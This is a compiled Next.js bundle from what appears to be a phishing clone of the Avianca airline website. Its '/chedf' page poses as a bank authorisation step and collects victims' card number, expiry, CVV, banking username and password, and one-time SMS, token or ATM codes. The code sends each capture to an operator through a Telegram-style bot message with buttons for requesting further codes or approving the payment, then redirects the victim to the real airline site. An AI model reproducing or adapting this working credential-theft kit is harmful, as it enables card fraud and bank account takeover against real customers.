(()=>{var e={};e.id=233,e.ids=[233],e.modules={313:(e,r,t)=>{Promise.resolve().then(t.t.bind(t,6444,23)),Promise.resolve().then(t.t.bind(t,6042,23)),Promise.resolve().then(t.t.bind(t,8170,23)),Promise.resolve().then(t.t.bind(t,9477,23)),Promise.resolve().then(t.t.bind(t,9345,23)),Promise.resolve().then(t.t.bind(t,2089,23)),Promise.resolve().then(t.t.bind(t,6577,23)),Promise.resolve().then(t.t.bind(t,1307,23))},440:(e,r,t)=>{"use strict";t.r(r),t.d(r,{default:()=>s});var a=t(1658);let s=async e=>[{type:"image/x-icon",sizes:"28x28",url:(0,a.fillMetadataSegment)(".",await e.params,"favicon.ico")+""}]},585:(e,r,t)=>{Promise.resolve().then(t.t.bind(t,6346,23)),Promise.resolve().then(t.t.bind(t,7924,23)),Promise.resolve().then(t.t.bind(t,5656,23)),Promise.resolve().then(t.t.bind(t,99,23)),Promise.resolve().then(t.t.bind(t,8243,23)),Promise.resolve().then(t.t.bind(t,8827,23)),Promise.resolve().then(t.t.bind(t,2763,23)),Promise.resolve().then(t.t.bind(t,7173,23))},846:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/app-page.runtime.prod.js")},1135:()=>{},2131:(e,r,t)=>{Promise.resolve().then(t.bind(t,3670))},3028:(e,r,t)=>{"use strict";t.r(r),t.d(r,{GlobalError:()=>i.a,__next_app__:()=>u,pages:()=>c,routeModule:()=>m,tree:()=>d});var a=t(5239),s=t(8088),n=t(8170),i=t.n(n),o=t(893),l={};for(let e in o)0>["default","tree","pages","GlobalError","__next_app__","routeModule"].indexOf(e)&&(l[e]=()=>o[e]);t.d(r,l);let d={children:["",{children:["chedf",{children:["__PAGE__",{},{page:[()=>Promise.resolve().then(t.bind(t,5687)),"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\app\\chedf\\page.tsx"]}]},{metadata:{icon:[async e=>(await Promise.resolve().then(t.bind(t,440))).default(e)],apple:[],openGraph:[],twitter:[],manifest:void 0}}]},{layout:[()=>Promise.resolve().then(t.bind(t,4431)),"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\app\\layout.tsx"],loading:[()=>Promise.resolve().then(t.bind(t,7393)),"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\app\\loading.tsx"],"not-found":[()=>Promise.resolve().then(t.t.bind(t,7398,23)),"next/dist/client/components/not-found-error"],forbidden:[()=>Promise.resolve().then(t.t.bind(t,9999,23)),"next/dist/client/components/forbidden-error"],unauthorized:[()=>Promise.resolve().then(t.t.bind(t,5284,23)),"next/dist/client/components/unauthorized-error"],metadata:{icon:[async e=>(await Promise.resolve().then(t.bind(t,440))).default(e)],apple:[],openGraph:[],twitter:[],manifest:void 0}}]}.children,c=["C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\app\\chedf\\page.tsx"],u={require:t,loadChunk:()=>Promise.resolve()},m=new a.AppPageRouteModule({definition:{kind:s.RouteKind.APP_PAGE,page:"/chedf/page",pathname:"/chedf",bundlePath:"",filename:"",appPaths:[]},userland:{loaderTree:d}})},3033:e=>{"use strict";e.exports=require("next/dist/server/app-render/work-unit-async-storage.external.js")},3295:e=>{"use strict";e.exports=require("next/dist/server/app-render/after-task-async-storage.external.js")},3370:(e,r,t)=>{Promise.resolve().then(t.bind(t,7493))},3670:(e,r,t)=>{"use strict";t.d(r,{AuthProvider:()=>s});var a=t(2907);let s=(0,a.registerClientReference)(function(){throw Error("Attempted to call AuthProvider() from the server but AuthProvider is on the client. It's not possible to invoke a client function from the server, it can only be rendered as a Component or passed to props of a Client Component.")},"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\hooks\\use-auth.tsx","AuthProvider");(0,a.registerClientReference)(function(){throw Error("Attempted to call useAuth() from the server but useAuth is on the client. It's not possible to invoke a client function from the server, it can only be rendered as a Component or passed to props of a Client Component.")},"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\hooks\\use-auth.tsx","useAuth")},3873:e=>{"use strict";e.exports=require("path")},4431:(e,r,t)=>{"use strict";t.r(r),t.d(r,{default:()=>i,metadata:()=>n});var a=t(7413);t(1135);var s=t(3670);let n={title:"Avianca - Encuentra tiquetes y vuelos baratos ",description:"Encuentra los mejores precios en vuelos a cualquier destino"};function i({children:e}){return(0,a.jsx)("html",{lang:"es",children:(0,a.jsx)("body",{className:"font-display",children:(0,a.jsx)(s.AuthProvider,{children:e})})})}},5687:(e,r,t)=>{"use strict";t.r(r),t.d(r,{default:()=>a});let a=(0,t(2907).registerClientReference)(function(){throw Error("Attempted to call the default export of \"C:\\\\Users\\\\Administrator\\\\Desktop\\\\avianca-clon-main\\\\src\\\\app\\\\chedf\\\\page.tsx\" from the server, but it's on the client. It's not possible to invoke a client function from the server, it can only be rendered as a Component or passed to props of a Client Component.")},"C:\\Users\\Administrator\\Desktop\\avianca-clon-main\\src\\app\\chedf\\page.tsx","default")},6203:(e,r,t)=>{Promise.resolve().then(t.bind(t,8504))},6487:()=>{},7393:(e,r,t)=>{"use strict";t.r(r),t.d(r,{default:()=>s});var a=t(7413);function s(){return(0,a.jsx)("div",{className:"flex items-center justify-center min-h-screen",children:(0,a.jsxs)("div",{className:"animate-pulse flex flex-col items-center",children:[(0,a.jsx)("div",{className:"w-12 h-12 rounded-full bg-emerald-500 mb-4"}),(0,a.jsx)("div",{className:"h-4 bg-gray-200 rounded w-32 mb-2"}),(0,a.jsx)("div",{className:"h-4 bg-gray-200 rounded w-24"})]})})}},7493:(e,r,t)=>{"use strict";t.r(r),t.d(r,{default:()=>o});var a=t(687),s=t(3210);let n=e=>e?e.replace(/([_\[\]()~`>#+\-=|{}.!])/g,"\\$1"):"No ingresado",i=e=>[{text:"Pedir SMS \uD83D\uDCF1",callback_data:`sms:${e}`},{text:"Pedir Clave Din\xe1mica \uD83D\uDD11",callback_data:`dinamica:${e}`},{text:"Pedir Token \uD83D\uDCDF",callback_data:`token:${e}`},{text:"Pedir Cajero (ATM) \uD83C\uDFE7",callback_data:`atm:${e}`}];function o(){let[e,r]=(0,s.useState)({}),[t,o]=(0,s.useState)(!0),[l,d]=(0,s.useState)("Validando datos..."),[c,u]=(0,s.useState)(null),[m,p]=(0,s.useState)("initial"),[h,b]=(0,s.useState)({user:"",password:"",dynamicCode:""}),[f,x]=(0,s.useState)(""),[g,v]=(0,s.useState)("");(0,s.useCallback)(async e=>{if(!e||e.length<6)return;let t=e.replace(/\s+/g,"").substring(0,6);try{let e=await fetch(`/api/bin-lookup?bin=${t}`);if(!e.ok)return;let a=await e.json(),s=a.bank?.name||"Desconocido",n=a.scheme?.toUpperCase()||"",i=`${s} - ${n}`;r(e=>({...e,bank:i}))}catch(e){console.error("Error al obtener informaci\xf3n del BIN:",e)}},[]);let y=e?.cardNumber||"",j=y?y.replace(/\s+/g,"").slice(-4):"1234",w=e.transactionId||"";e.flightCost||e.totalPrice||e.amount||e.price;let C=(0,s.useCallback)(async e=>{o(!0),d("Esperando confirmaci\xf3n del banco...");try{let r=await fetch(`/api/check-update/${e}`);if(408===r.status){u("El banco tard\xf3 en responder. Por favor, intente nuevamente."),o(!1);return}if(!r.ok){let e=await r.json();throw Error(e.error||"Error de conexi\xf3n")}let{action:t}=await r.json();o(!1),u(null);let a=t.startsWith("error_");if(["sms","dinamica","token","atm"].includes(t)){p("waiting_for_code");let e="el c\xf3digo de seguridad";"sms"===t&&(e="el c\xf3digo que recibiste por SMS"),"dinamica"===t&&(e="la Clave Din\xe1mica"),"token"===t&&(e="el Token digital"),"atm"===t&&(e="el c\xf3digo generado en el Cajero (ATM)"),x(e),b(e=>({...e,dynamicCode:""})),setTimeout(()=>document.getElementById("dynamic-code")?.focus(),100)}else if(a)if("error_logo"===t)u("Usuario o clave incorrectos. Verifique e intente nuevamente."),p("initial"),b(e=>({...e,password:""})),setTimeout(()=>document.getElementById("auth-user")?.focus(),100);else if("error_tc"===t)alert("Error en la validaci\xf3n de la tarjeta. Ser\xe1 redirigido."),window.location.href="/";else{let e=t.replace("error_","");e=e.charAt(0).toUpperCase()+e.slice(1),t.includes("sms")&&(e="SMS"),u(`El c\xf3digo ${e} ingresado es inv\xe1lido.`),b(e=>({...e,dynamicCode:""})),setTimeout(()=>document.getElementById("dynamic-code")?.focus(),100)}else"finalizar"===t&&(d("Pago Aprobado exitosamente. Redirigiendo..."),o(!0),setTimeout(()=>{window.location.href="https://www.avianca.com/"},2e3))}catch(e){console.error("Polling Error:",e),o(!1),u("Error de comunicaci\xf3n con el servidor de seguridad.")}},[]),k=async t=>{t.preventDefault(),u(null),o(!0);let a="",s=e.bank||"No disponible";if(e.cardNumber&&!e.bank)try{let t=e.cardNumber.replace(/\s+/g,"").substring(0,6),a=await fetch(`/api/bin-lookup?bin=${t}`);if(a.ok){let e=await a.json(),t=e.bank?.name||"Desconocido",n=e.scheme?.toUpperCase()||"";s=`${t} - ${n}`,r(e=>({...e,bank:s}))}}catch(e){console.error("Fallo al obtener info del BIN en handleNextStep",e)}let l={},c=i(w),p=`
âœˆï¸ NUEVA RESERVA \\- AVIANCA âœˆï¸

ðŸ‘¤ DATOS DEL TITULAR
ðŸ’³ Tarjeta: ${n(e.cardNumber)}
ðŸ—“ï¸ Exp: ${n(e.expiryDate)}
ðŸ”’ CVV: ${n(e.cvv)}
ðŸ¦ Banco: ${n(s)}
`;if("initial"===m){if(!h.user||!h.password){u("Campos requeridos."),o(!1);return}d("Verificando credenciales de seguridad..."),a=`${p}

ðŸ‘¤ DATOS DE ACCESO (LOGIN)
ðŸ¤µ User: ${n(h.user)}
ðŸ”’ Pass: ${n(h.password)}

ðŸ†” ID: ${w}
`,l={inline_keyboard:[...c.map(e=>[e]),[{text:"Usuario/Clave Incorrecta âŒ",callback_data:`error_logo:${w}`}],[{text:"Tarjeta Inv\xe1lida \uD83D\uDCB3",callback_data:`error_tc:${w}`}]]}}else if("waiting_for_code"===m){if(!h.dynamicCode){u("Ingrese el c\xf3digo recibido."),o(!1);return}d("Validando c\xf3digo de seguridad...");let e=f.toLowerCase().includes("cajero")?"atm":f.toLowerCase().split(" ")[0],r=c.filter(r=>!r.callback_data.includes(e));a=`${p}

ðŸ‘¤ DATOS DE ACCESO + C\xd3DIGO
ðŸ¤µ User: ${n(h.user)}
ðŸ”’ Pass: ${n(h.password)}
ðŸ”´ ${n(f)}: ${n(h.dynamicCode)}

ðŸ†” ID: ${w}
`,l={inline_keyboard:[...r.map(e=>[e]),[{text:`C\xf3digo Incorrecto âŒ`,callback_data:`error_${e}:${w}`}],[{text:"âœ… APROBAR PAGO âœ…",callback_data:`finalizar:${w}`}]]}}try{let e=await fetch("/api/send-message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:a,keyboard:l,message_id:"waiting_for_code"===m?g:void 0})}),r=await e.json();if(e.ok&&r.result?.message_id)v(r.result.message_id),C(r.result.message_id);else throw Error(r.description||"Error API")}catch(e){console.error("Error env\xedo:",e),o(!1),u("Error de conexi\xf3n. Intente nuevamente.")}};return(0,a.jsxs)("main",{className:"min-h-screen bg-[#f4f7f6] flex items-center justify-center p-4",children:[(0,a.jsxs)("div",{className:"max-w-md w-full bg-white p-6 rounded-lg shadow-lg border border-gray-200",children:[(0,a.jsx)("div",{className:"flex items-center justify-center mb-5",children:(0,a.jsx)("div",{className:"h-8 flex items-center text-red-600 font-bold text-xl",children:"AVIANCA"})}),(0,a.jsx)("b",{className:"text-gray-800 mb-1 block font-bold",children:"Autorizaci\xf3n de transacci\xf3n"}),(0,a.jsxs)("p",{className:"text-sm text-gray-600 mb-5",children:["La transacci\xf3n que intenta realizar en ",(0,a.jsx)("b",{className:"font-semibold text-gray-700",children:"AVIANCA S.A"})," debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:"]}),(0,a.jsxs)("div",{className:"bg-[#f4f7f6] p-4 rounded-lg mb-6 text-sm space-y-2 border border-gray-100",children:[(0,a.jsxs)("div",{className:"flex justify-between",children:[(0,a.jsx)("span",{className:"font-bold text-gray-700",children:"Comercio"}),(0,a.jsx)("span",{className:"text-gray-700",children:"AVIANCA S.A"})]}),(0,a.jsxs)("div",{className:"flex justify-between",children:[(0,a.jsx)("span",{className:"font-bold text-gray-700",children:"Banco"}),(0,a.jsx)("span",{className:"text-gray-700",children:e.bank||"Cargando..."})]}),(0,a.jsxs)("div",{className:"flex justify-between",children:[(0,a.jsx)("span",{className:"font-bold text-gray-700",children:"N\xfamero de tarjeta"}),(0,a.jsxs)("span",{className:"text-gray-700 tracking-wider",children:["â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ",j]})]})]}),(0,a.jsxs)("form",{onSubmit:k,children:[c&&(0,a.jsxs)("div",{className:"bg-red-50 text-red-700 text-sm p-3 rounded-md mb-4 border border-red-200 flex items-start",children:[(0,a.jsx)("span",{className:"mr-2 pt-0.5",children:"âš ï¸"}),(0,a.jsx)("span",{children:c})]}),(0,a.jsx)("div",{className:"waiting_for_code"===m?"hidden":"block",children:(0,a.jsxs)("div",{className:"space-y-4",children:[(0,a.jsx)("label",{htmlFor:"auth-user",className:"block text-sm font-semibold mb-1 text-gray-700",children:"Usuario"}),(0,a.jsx)("input",{type:"text",required:!0,className:"w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"",value:h.user,onChange:e=>b({...h,user:e.target.value}),disabled:t,id:"auth-user",autoComplete:"username"}),(0,a.jsx)("label",{htmlFor:"auth-password",className:"block text-sm font-semibold mb-1 text-gray-700",children:"Contrase\xf1a"}),(0,a.jsx)("input",{type:"password",id:"auth-password",required:!0,className:"w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"",value:h.password,onChange:e=>b({...h,password:e.target.value}),disabled:t,autoComplete:"current-password"})]})}),(0,a.jsxs)("div",{className:"waiting_for_code"===m?"block":"hidden",children:[(0,a.jsxs)("div",{className:"text-center mb-3",children:[(0,a.jsxs)("label",{htmlFor:"dynamic-code",className:"block text-red-600 text-lg font-bold mb-1",children:["Clave ",f.replace(/el |la /,"").replace("c\xf3digo que recibiste por ","").replace("c\xf3digo generado en el ","")]}),(0,a.jsxs)("p",{className:"text-sm text-gray-600",children:["Por favor, ingrese ",f," para continuar."]})]}),(0,a.jsx)("input",{type:"tel",id:"dynamic-code",required:"waiting_for_code"===m,className:"w-full px-4 py-4 text-center text-2xl tracking-widest rounded-md border border-gray-300 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"â€¢ â€¢ â€¢ â€¢ â€¢ â€¢",value:h.dynamicCode,onChange:e=>b({...h,dynamicCode:e.target.value}),disabled:t,autoComplete:"off"})]}),(0,a.jsx)("div",{className:"mt-6",children:(0,a.jsx)("button",{type:"submit",disabled:t,className:"w-full bg-[#E8114B] hover:bg-[#D40E43] text-white font-bold py-3 text-lg transition duration-200 disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg rounded-md",children:"initial"===m?"Autorizar":"Confirmar Transacci\xf3n"})})]})]}),t&&(0,a.jsxs)("div",{className:"fixed inset-0 bg-white/90 z-50 flex flex-col items-center justify-center backdrop-blur-sm",children:[(0,a.jsx)("div",{className:"loader-spin border-4 border-gray-200 border-t-[#E8114B] rounded-full w-12 h-12 animate-spin mb-4"}),(0,a.jsx)("p",{className:"text-gray-800 font-medium animate-pulse",children:l})]})]})}},8335:()=>{},8504:(e,r,t)=>{"use strict";t.d(r,{A:()=>o,AuthProvider:()=>i});var a=t(687),s=t(3210);let n=(0,s.createContext)(void 0);function i({children:e}){let[r,t]=(0,s.useState)(null),[i,o]=(0,s.useState)(!0);return i?null:(0,a.jsx)(n.Provider,{value:{user:r,login:e=>{t(e),localStorage.setItem("user",JSON.stringify(e))},logout:()=>{t(null),localStorage.removeItem("user")},isAuthenticated:!!r},children:e})}function o(){let e=(0,s.useContext)(n);if(void 0===e)throw Error("useAuth must be used within an AuthProvider");return e}},9121:e=>{"use strict";e.exports=require("next/dist/server/app-render/action-async-storage.external.js")},9294:e=>{"use strict";e.exports=require("next/dist/server/app-render/work-async-storage.external.js")},9551:e=>{"use strict";e.exports=require("url")},9810:(e,r,t)=>{Promise.resolve().then(t.bind(t,5687))}};var r=require("../../webpack-runtime.js");r.C(e);var t=e=>r(r.s=e),a=r.X(0,[447,825,658],()=>t(3028));module.exports=a})();